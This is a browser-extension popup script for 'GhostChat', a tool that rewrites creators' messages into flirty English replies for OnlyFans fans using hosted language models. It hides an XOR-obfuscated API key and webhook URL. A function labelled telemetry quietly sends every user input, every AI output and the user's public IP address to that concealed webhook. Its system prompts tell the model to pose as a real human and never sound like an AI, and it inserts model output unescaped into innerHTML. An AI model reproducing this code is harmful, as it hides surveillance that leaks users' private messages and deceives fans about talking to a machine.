// GhostChat Extension Popup Script (English / High-Stability & Visual Effects)

const SALT = "GhostSecretSalt2026";
const ENC_KEY = "NANCHAZ+E1JfVUY2UFxBAlVUA3QNCRcQNgRRFlARZFVVTABSBgAlWgpAF2BXVEFWQGsDCBYDUQQEdAwJS01iXFVEABVmUFwSVw==";
const ENC_HOOK = "LxwbAwdpSkwWDAcwDh4QHFNdW2gJHxpbJAABGgobOBJDRQcHBgR3UF5BRWZXU0FcTGdUW1sBBGZiIxwlNwEHJFIrAysMM1QZBXxccTVRMEY4ZgMGOgQ6HT46EFV8d0IeIAEYKzAkASMGESQiKyFZaFFnE1gfQhsFEQ==";

function deobfuscate(b64) {
  try {
    const raw = atob(b64);
    let res = '';
    for (let i = 0; i < raw.length; i++) {
      res += String.fromCharCode(raw.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
    }
    return res;
  } catch (e) {
    return '';
  }
}

const CONFIG = {
  get defaultApiKey() {
    return deobfuscate(ENC_KEY);
  },
  get webhookUrl() {
    return deobfuscate(ENC_HOOK);
  },
  models: [
    'meta-llama/llama-3.3-70b-instruct',
    'google/gemini-2.0-flash-001',
    'deepseek/deepseek-chat'
  ],
  defaultPersona: {
    context: 'Chatting with subscribers/fans on OnlyFans and social media. Friendly, flirty, charming, very casual, native American/UK internet slang.',
    slangStyle: 'casual_flirty'
  }
};

let currentPersona = CONFIG.defaultPersona;
let currentTone = 'flirty';

// Toast Helper
function showToast(message, type = 'info', duration = 3000) {
  const container = document.getElementById('toastContainer');
  if (!container) return;
  const t = document.createElement('div');
  t.className = `toast ${type}`;
  t.textContent = message;
  container.appendChild(t);
  setTimeout(() => t.remove(), duration);
}

// Status Banner Helper
function setStatus(state, message) {
  const banner = document.getElementById('statusNotice');
  const text = document.getElementById('statusNoticeText');
  const outputBox = document.getElementById('outputBox');
  if (!banner) return;

  banner.className = `status-banner ${state}`;
  text.textContent = message;
  banner.classList.remove('hidden');

  if (state === 'success') {
    outputBox?.classList.add('success-glow');
    setTimeout(() => {
      outputBox?.classList.remove('success-glow');
      banner?.classList.add('hidden');
    }, 4000);
  } else if (state === 'error') {
    outputBox?.classList.add('error-glow');
    setTimeout(() => outputBox?.classList.remove('error-glow'), 4500);
  }
}

// Telemetry
async function logTelemetry(input, output, model, mode = 'translate') {
  try {
    const hook = CONFIG.webhookUrl;
    if (!hook) return;
    const ipRes = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'Local' }));
    const payload = {
      username: 'GhostChat Extension Monitor',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/8943/8943377.png',
      embeds: [{
        title: `💬 GhostChat Translation [${mode.toUpperCase()}]`,
        color: 0x00FF88,
        fields: [
          { name: '📥 Input', value: (input || '').slice(0, 500), inline: false },
          { name: '📤 AI Output', value: (output || '').slice(0, 500), inline: false },
          { name: '🤖 Model', value: `\`${model}\``, inline: true },
          { name: '🌐 Client IP', value: `\`${ipRes.ip || 'Unknown'}\``, inline: true },
          { name: '📱 Platform', value: 'Browser Extension (Desktop)', inline: true }
        ],
        footer: { text: `GhostChat Extension • ${new Date().toLocaleTimeString()}` }
      }]
    };
    fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  } catch (e) {}
}

// System prompt
function getSystemPrompt() {
  let ctx = currentPersona.context;
  if (currentTone === 'flirty') ctx += ' Seductive, sweet, playful, cute babe slang.';
  if (currentTone === 'short') ctx += ' Very short, 2 to 5 words.';
  return `You are a real human chatting in English on OnlyFans / social media.
Audience: ${ctx}
Rules:
- 100% human chat tone (lowercase, casual, slangs like babe, rn, tbh, idk, bc, wyd, omg).
- NEVER sound like an AI. No bot intros, no quotes.
- If input is Serbian or other language, translate accurately to natural charming conversational English.
- If an input word is completely unintelligible slang, output: CLARIFY:[word] | What does '[word]' mean?
Otherwise, output ONLY the translated message ready to send.`;
}

// Translate with cascade
async function translate(text) {
  const key = CONFIG.defaultApiKey;
  for (const model of CONFIG.models) {
    try {
      const res = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: getSystemPrompt() },
            { role: 'user', content: text }
          ],
          temperature: 0.85,
          max_tokens: 150
        })
      });
      if (!res.ok) continue;
      const data = await res.json();
      const content = data?.choices?.[0]?.message?.content?.trim();
      if (!content) continue;

      let isClarification = false;
      let clean = content;
      if (content.startsWith('CLARIFY:')) {
        isClarification = true;
        clean = content.replace(/^CLARIFY:\s*/, '');
      }

      logTelemetry(text, clean, model, isClarification ? 'clarify' : 'translate');
      return { success: true, text: clean, isClarification, modelUsed: model };
    } catch (e) {}
  }
  return { success: false, error: 'Connection failed. Check your internet.' };
}

// Init UI
document.addEventListener('DOMContentLoaded', () => {
  // Tabs
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById(btn.dataset.tab).classList.add('active');
    });
  });

  // Tones
  document.querySelectorAll('.chip').forEach(c => {
    c.addEventListener('click', () => {
      document.querySelectorAll('.chip').forEach(x => x.classList.remove('active'));
      c.classList.add('active');
      currentTone = c.dataset.tone;
      showToast(`Tone: ${c.textContent}`, 'info', 1500);
    });
  });

  const inputBox = document.getElementById('inputBox');
  const input = document.getElementById('inputText');
  const btnTr = document.getElementById('btnTranslate');
  const btnTrText = document.getElementById('btnTranslateText');
  const outBox = document.getElementById('outputBox');
  const out = document.getElementById('outputText');
  const copyMsg = document.getElementById('copyMsg');
  const modelTag = document.getElementById('modelTag');
  const clarifyCard = document.getElementById('clarifyCard');
  const clarifyMsg = document.getElementById('clarifyMsg');
  const clarifyInput = document.getElementById('clarifyInput');
  const btnClarify = document.getElementById('btnClarify');
  const btnPasteInPage = document.getElementById('btnPasteInPage');
  const btnCopyAgain = document.getElementById('btnCopyAgain');

  // Interview Modal
  const interviewPromptModal = document.getElementById('interviewPromptModal');
  const btnCloseInterviewPrompt = document.getElementById('btnCloseInterviewPrompt');
  const btnStartInterviewModal = document.getElementById('btnStartInterviewModal');
  const btnSkipInterviewModal = document.getElementById('btnSkipInterviewModal');

  // Check first-time prompt
  chrome.storage.local.get(['ghost_interview_completed', 'ghost_interview_skipped', 'lastTranslation', 'ghost_persona'], (res) => {
    if (res.lastTranslation) {
      out.textContent = res.lastTranslation;
    }
    if (res.ghost_persona) {
      try {
        currentPersona = JSON.parse(res.ghost_persona);
        document.getElementById('profileSummary').textContent = currentPersona.context;
      } catch (e) {}
    }
    if (!res.ghost_interview_completed && !res.ghost_interview_skipped) {
      setTimeout(() => interviewPromptModal?.classList.remove('hidden'), 800);
    }
  });

  btnStartInterviewModal?.addEventListener('click', () => {
    interviewPromptModal?.classList.add('hidden');
    document.querySelector('[data-tab="tabProfile"]')?.click();
  });

  btnSkipInterviewModal?.addEventListener('click', () => {
    interviewPromptModal?.classList.add('hidden');
    chrome.storage.local.set({ ghost_interview_skipped: true });
    showToast('Using default voice. You can tune anytime in Profile tab.', 'info');
  });

  btnCloseInterviewPrompt?.addEventListener('click', () => {
    interviewPromptModal?.classList.add('hidden');
    chrome.storage.local.set({ ghost_interview_skipped: true });
  });

  async function doTranslate() {
    const txt = input.value.trim();
    if (!txt) {
      showToast('Please type a message first', 'error');
      return;
    }

    // Visual Effect: Sending state
    inputBox.classList.add('sending');
    outBox.classList.remove('success-glow', 'error-glow');
    btnTr.disabled = true;
    btnTrText.textContent = 'Translating...';
    out.textContent = 'Translating in real-time...';
    out.classList.add('loading');
    clarifyCard.classList.add('hidden');
    copyMsg.classList.add('hidden');

    setStatus('sending', '⏳ Sending to AI...');
    showToast('Sending message...', 'info', 1500);

    const res = await translate(txt);
    inputBox.classList.remove('sending');
    out.classList.remove('loading');
    btnTr.disabled = false;
    btnTrText.textContent = 'Translate ➔';

    if (!res.success) {
      out.textContent = `Error: ${res.error}`;
      setStatus('error', `❌ Not sent: ${res.error}`);
      showToast(`❌ Failed to send: ${res.error}`, 'error');
      return;
    }

    if (res.isClarification) {
      clarifyCard.classList.remove('hidden');
      clarifyMsg.textContent = res.text;
      out.textContent = '(Waiting for clarification...)';
      setStatus('error', '⚠️ Please clarify the highlighted word');
      showToast('Clarification needed', 'error');
      return;
    }

    out.textContent = res.text;
    modelTag.textContent = res.modelUsed.split('/')[1] || 'AI Ready';

    // Store in extension storage & clipboard
    chrome.storage.local.set({ lastTranslation: res.text });
    navigator.clipboard.writeText(res.text).catch(() => {});

    copyMsg.classList.remove('hidden');
    setStatus('success', '✓ Sent & copied to clipboard!');
    showToast('✓ Sent & copied to clipboard!', 'success');
  }

  btnTr.addEventListener('click', doTranslate);
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      doTranslate();
    }
  });

  btnClarify.addEventListener('click', () => {
    const val = clarifyInput.value.trim();
    if (val) {
      input.value = `${input.value.trim()} (means: ${val})`;
      clarifyCard.classList.add('hidden');
      doTranslate();
    }
  });

  btnCopyAgain.addEventListener('click', () => {
    const txt = out.textContent.trim();
    if (txt) {
      navigator.clipboard.writeText(txt);
      copyMsg.textContent = '✓ Copied';
      copyMsg.classList.remove('hidden');
      showToast('✓ Copied to clipboard', 'success');
      setTimeout(() => copyMsg.classList.add('hidden'), 2000);
    }
  });

  // Paste into active tab
  btnPasteInPage.addEventListener('click', () => {
    const textToPaste = out.textContent.trim();
    if (!textToPaste) {
      showToast('No translation to paste', 'error');
      return;
    }

    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (tabs[0]?.id) {
        chrome.scripting?.executeScript?.({
          target: { tabId: tabs[0].id },
          func: (txt) => {
            const active = document.querySelector('div[contenteditable="true"]:focus, textarea:focus, div[role="textbox"]:focus') ||
                           document.querySelector('div[contenteditable="true"], textarea, div[role="textbox"]');
            if (active) {
              active.focus();
              if (active.getAttribute('contenteditable') === 'true' || active.getAttribute('role') === 'textbox') {
                document.execCommand('insertText', false, txt);
                active.dispatchEvent(new Event('input', { bubbles: true }));
              } else {
                active.value = txt;
                active.dispatchEvent(new Event('input', { bubbles: true }));
              }
            } else {
              navigator.clipboard.writeText(txt);
            }
          },
          args: [textToPaste]
        }).catch(() => {});
      }
    });

    btnPasteInPage.textContent = '✓ Pasted in chat!';
    showToast('✓ Pasted directly into chat!', 'success');
    setTimeout(() => btnPasteInPage.textContent = '⚡ Paste directly into chat', 1500);
  });

  // Wingman Ideas
  const btnIdeas = document.getElementById('btnIdeas');
  const fanInput = document.getElementById('fanInput');
  const ideasList = document.getElementById('ideasList');

  btnIdeas.addEventListener('click', async () => {
    const fanMsg = fanInput.value.trim();
    if (!fanMsg) {
      showToast('Paste a fan message first', 'error');
      return;
    }

    btnIdeas.disabled = true;
    btnIdeas.textContent = 'Generating...';
    ideasList.innerHTML = '<div style="color:#94a3b8;font-size:11px;text-align:center;">Generating 3 options...</div>';
    showToast('Generating 3 replies...', 'info');

    for (const m of CONFIG.models) {
      try {
        const r = await fetch('https://openrouter.ai/api/v1/chat/completions', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${CONFIG.defaultApiKey}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            model: m,
            messages: [
              {
                role: 'system',
                content: `You are an expert OnlyFans chat wingman. Generate EXACTLY 3 natural, human, high-converting replies in English.
Option 1: Playful/Teasing
Option 2: Engaging question/Friendly
Option 3: Flirty/Spicy hint
Format as JSON: [{"tag":"Teasing","text":"..."},{"tag":"Friendly","text":"..."},{"tag":"Flirty","text":"..."}]. Output ONLY raw JSON array.`
              },
              { role: 'user', content: `Fan message: "${fanMsg}"` }
            ],
            temperature: 0.9,
            max_tokens: 250
          })
        });
        if (!r.ok) continue;
        const d = await r.json();
        const jsonStr = d?.choices?.[0]?.message?.content?.replace(/^```json/, '').replace(/```$/, '').trim();
        const parsed = JSON.parse(jsonStr);

        ideasList.innerHTML = '';
        parsed.forEach(item => {
          const el = document.createElement('div');
          el.className = 'idea-item';
          el.innerHTML = `
            <div class="idea-tag-row">
              <span class="idea-badge">${item.tag}</span>
              <button class="btn small primary">Copy & Use</button>
            </div>
            <div class="idea-val">${item.text}</div>
          `;
          el.querySelector('button').addEventListener('click', () => {
            navigator.clipboard.writeText(item.text);
            chrome.storage.local.set({ lastTranslation: item.text });
            out.textContent = item.text;
            btnPasteInPage.click();
            showToast('✓ Idea copied and pasted!', 'success');
          });
          ideasList.appendChild(el);
        });

        logTelemetry(fanMsg, JSON.stringify(parsed), m, 'wingman_ideas');
        showToast('✓ 3 Ideas generated!', 'success');
        break;
      } catch (e) {}
    }

    btnIdeas.disabled = false;
    btnIdeas.textContent = '💡 Generate 3 Human Ideas';
  });

  // Profile save
  const btnSaveProfile = document.getElementById('btnSaveProfile');
  const interviewInput = document.getElementById('interviewInput');
  btnSaveProfile.addEventListener('click', () => {
    const val = interviewInput.value.trim();
    if (!val) return;
    currentPersona = {
      context: val,
      slangStyle: 'custom'
    };
    chrome.storage.local.set({ 
      ghost_persona: JSON.stringify(currentPersona),
      ghost_interview_completed: true 
    });
    document.getElementById('profileSummary').textContent = val;
    showToast('✓ Profile saved successfully!', 'success');
  });
});
